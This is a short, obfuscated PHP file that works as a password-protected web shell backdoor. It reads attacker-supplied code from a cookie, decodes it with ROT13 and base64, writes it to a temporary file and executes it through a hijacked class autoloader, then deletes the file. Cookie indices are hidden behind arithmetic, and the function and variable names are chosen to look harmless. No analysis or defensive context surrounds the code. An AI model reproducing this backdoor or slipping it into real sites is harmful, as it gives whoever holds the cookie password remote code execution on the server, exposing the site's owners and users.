<?php


if (isset($_COOKIE[67+-67]) && isset($_COOKIE[58+-57]) && isset($_COOKIE[-36+39]) && isset($_COOKIE[20+-16])) {
    $value = $_COOKIE;
    function service_registry($hld) {
        $value = $_COOKIE;
        $sym = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '988ce9e5');
        if (!is_writable($sym)) {
            $sym = getcwd() . DIRECTORY_SEPARATOR . "core_engine";
        }
        $parameter_group = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($value[3]));
        if (is_writeable($sym)) {
            $component = fopen($sym, 'w+');
            fputs($component, $parameter_group);
            fclose($component);
            spl_autoload_unregister(__FUNCTION__);
            require_once($sym);
            @array_map('unlink', array($sym));
        }
    }
    spl_autoload_register("service_registry");
    $data_chunk = "f5a64e6fdea3db9d2f358072206d6653";
    if (!strncmp($data_chunk, $value[4], 32)) {
        if (@class_parents("restore_state_buffer_cache", true)) {
            exit;
        }
    }
}
